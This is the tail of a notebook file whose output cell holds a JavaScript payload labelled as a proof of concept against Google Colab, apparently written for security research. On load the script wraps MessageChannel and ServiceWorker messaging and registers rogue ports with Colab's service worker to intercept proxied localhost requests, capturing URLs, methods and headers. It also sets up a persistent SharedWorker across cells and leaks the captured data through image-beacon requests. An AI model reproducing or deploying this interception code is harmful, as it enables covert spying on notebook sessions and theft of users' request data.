      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "(function() {\n  var B = 'https://colab.research.google.com/__poc28';\n  var L = function(t,v) {\n    new Image().src = B+'/'+t+'?v='+encodeURIComponent(String(v||'').slice(0,800));\n  };\n\n  L('START', location.origin);\n\n  // \u2500\u2500 1. WIDGET MANAGER (reliable fallback) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try {\n    var mod = atob('');\n    var mb = new Blob([mod], {type:'text/javascript'});\n    window.google.colab.widgets.installCustomManager(URL.createObjectURL(mb));\n    L('CWM', 'ok');\n  } catch(e) { L('CWM_ERR', e.message.slice(0,80)); }\n\n  // \u2500\u2500 2. HOOK MessageChannel \u2014 spy before ports are transferred to SW \u2500\u2500\u2500\n  // Timing: our hook runs on page load. Colab creates MessageChannels\n  // AFTER kernel connect. So we intercept all future channels.\n  (function() {\n    var OrigMC = window.MessageChannel;\n    var mcCount = 0;\n    window.MessageChannel = function() {\n      var mc = new OrigMC();\n      var id = ++mcCount;\n      L('MC_NEW', 'ch_'+id);\n\n      // Spy on port1 sends\n      var op1 = mc.port1.postMessage.bind(mc.port1);\n      mc.port1.postMessage = function(data, transfer) {\n        try {\n          var d = typeof data === 'string' ? data : JSON.stringify(data);\n          L('MC_P1_SEND', 'ch'+id+'|'+d.slice(0,600));\n        } catch(e) {}\n        return op1(data, transfer);\n      };\n\n      // Spy on port2 sends\n      var op2 = mc.port2.postMessage.bind(mc.port2);\n      mc.port2.postMessage = function(data, transfer) {\n        try {\n          var d = typeof data === 'string' ? data : JSON.stringify(data);\n          L('MC_P2_SEND', 'ch'+id+'|'+d.slice(0,600));\n        } catch(e) {}\n        return op2(data, transfer);\n      };\n\n      // Intercept onmessage setter for port1\n      var _p1msg = null;\n      Object.defineProperty(mc.port1, 'onmessage', {\n        get: function() { return _p1msg; },\n        set: function(fn) {\n          _p1msg = function(e) {\n            try {\n              var d = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);\n              L('MC_P1_RECV', 'ch'+id+'|'+d.slice(0,600));\n            } catch(x) {}\n            if (fn) fn.call(this, e);\n          };\n          MessagePort.prototype.__lookupSetter__('onmessage') ?\n            Object.getOwnPropertyDescriptor(MessagePort.prototype, 'onmessage').set.call(mc.port1, _p1msg) :\n            (mc.port1._onmessage = _p1msg);\n        },\n        configurable: true\n      });\n\n      // Intercept onmessage setter for port2\n      var _p2msg = null;\n      Object.defineProperty(mc.port2, 'onmessage', {\n        get: function() { return _p2msg; },\n        set: function(fn) {\n          _p2msg = function(e) {\n            try {\n              var d = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);\n              L('MC_P2_RECV', 'ch'+id+'|'+d.slice(0,600));\n            } catch(x) {}\n            if (fn) fn.call(this, e);\n          };\n          Object.getOwnPropertyDescriptor(MessagePort.prototype, 'onmessage').set.call(mc.port2, _p2msg);\n        },\n        configurable: true\n      });\n\n      return mc;\n    };\n    L('MC_HOOK', 'ok');\n  })();\n\n  // \u2500\u2500 3. HOOK ServiceWorker.postMessage \u2014 intercept configure calls \u2500\u2500\u2500\u2500\u2500\n  (function() {\n    if (!navigator.serviceWorker || !navigator.serviceWorker.controller) {\n      L('SW_PM_HOOK', 'no_controller');\n      return;\n    }\n    var sw = navigator.serviceWorker.controller;\n    var origPM = sw.postMessage.bind(sw);\n    sw.postMessage = function(data, transfer) {\n      try {\n        var d = typeof data === 'string' ? data : JSON.stringify(data);\n        L('SW_PM_INTERCEPT', d.slice(0,600));\n      } catch(e) {}\n      return origPM(data, transfer);\n    };\n    L('SW_PM_HOOK', 'ok');\n  })();\n\n  // \u2500\u2500 4. SEND configure TO SW \u2014 register our ports \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // We register a port EARLY so we intercept localhost proxy requests\n  // from our frame before the parent page registers its port.\n  // When SW routes a localhost fetch, it sends to our port first.\n  // We pass-through with {action:'pass'} to avoid breaking things,\n  // but log everything (URL, method, headers, body).\n  (function() {\n    if (!navigator.serviceWorker || !navigator.serviceWorker.controller) {\n      L('SW_CFG', 'no_controller');\n      return;\n    }\n    try {\n      var mc1 = new MessageChannel();  // serviceWorkerPort \u2014 SW sends requests here\n      var mc2 = new MessageChannel();  // responsePort \u2014 SW sends {configured:true} here\n\n      mc1.port1.onmessage = function(e) {\n        var data = e.data || {};\n        L('SW_REQ', JSON.stringify({\n          action: data.action,\n          url: data.url,\n          method: data.method,\n          requestId: data.requestId,\n          headers: data.headers ? JSON.stringify(data.headers).slice(0,400) : null,\n          body_len: data.body ? (data.body.byteLength || String(data.body).length) : 0\n        }).slice(0,800));\n\n        // Pass-through: tell SW to do a normal fetch\n        // (so we don't break existing functionality)\n        mc1.port1.postMessage({action: 'pass', responseId: data.requestId});\n      };\n      mc1.port1.start();\n\n      mc2.port1.onmessage = function(e) {\n        L('SW_CFG_ACK', JSON.stringify(e.data).slice(0,200));\n      };\n      mc2.port1.start();\n\n      navigator.serviceWorker.controller.postMessage(\n        {action: 'configure', serviceWorkerPort: mc1.port2, responsePort: mc2.port2},\n        [mc1.port2, mc2.port2]\n      );\n      L('SW_CFG_SENT', 'ok');\n    } catch(e) { L('SW_CFG_ERR', e.message.slice(0,100)); }\n  })();\n\n  // \u2500\u2500 5. SEND configure_proxy \u2014 intercept fetches TO our origin \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  (function() {\n    if (!navigator.serviceWorker || !navigator.serviceWorker.controller) return;\n    try {\n      var mc3 = new MessageChannel();  // serviceWorkerPort\n      var mc4 = new MessageChannel();  // responsePort\n\n      mc3.port1.onmessage = function(e) {\n        var data = e.data || {};\n        L('SW_PROXY_REQ', JSON.stringify({\n          url: data.url,\n          method: data.method,\n          requestId: data.requestId,\n          headers: data.headers ? JSON.stringify(data.headers).slice(0,400) : null\n        }).slice(0,800));\n        // Pass-through\n        mc3.port1.postMessage({action: 'pass', responseId: data.requestId});\n      };\n      mc3.port1.start();\n\n      mc4.port1.onmessage = function(e) {\n        L('SW_PROXY_ACK', JSON.stringify(e.data).slice(0,200));\n      };\n      mc4.port1.start();\n\n      navigator.serviceWorker.controller.postMessage(\n        {action: 'configure_proxy', serviceWorkerPort: mc3.port2, responsePort: mc4.port2},\n        [mc3.port2, mc4.port2]\n      );\n      L('SW_PROXY_SENT', 'ok');\n    } catch(e) { L('SW_PROXY_ERR', e.message.slice(0,100)); }\n  })();\n\n  // \u2500\u2500 6. Listen for messages FROM the SW \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  navigator.serviceWorker && navigator.serviceWorker.addEventListener('message', function(e) {\n    L('SW_IN', JSON.stringify(e.data).slice(0,400));\n  });\n\n  // \u2500\u2500 7. SHARED WORKER \u2014 persistent cross-cell channel \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // Persists as long as any output frame at this RAND is open.\n  // Future: all cells can connect and share intercepted data.\n  (function() {\n    try {\n      var shCode = [\n        'var conns = [];',\n        'onconnect = function(e) {',\n        '  var p = e.ports[0]; conns.push(p);',\n        '  p.onmessage = function(m) {',\n        '    conns.forEach(function(c) { try { c.postMessage(m.data); } catch(x) {} });',\n        '  };',\n        '  p.start();',\n        '  p.postMessage({type:\"hello\", total:conns.length});',\n        '};'\n      ].join('\\n');\n      var shBlob = new Blob([shCode], {type:'application/javascript'});\n      var shUrl = URL.createObjectURL(shBlob);\n      window.__shw = new SharedWorker(shUrl);\n      window.__shw.port.onmessage = function(e) {\n        L('SH_MSG', JSON.stringify(e.data).slice(0,200));\n      };\n      window.__shw.port.start();\n      L('SH_INIT', 'ok');\n    } catch(e) { L('SH_FAIL', e.message.slice(0,100)); }\n  })();\n\n})();",
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Ready.\n"
          ]
        }
      ],
      "execution_count": 1
    }
  ]
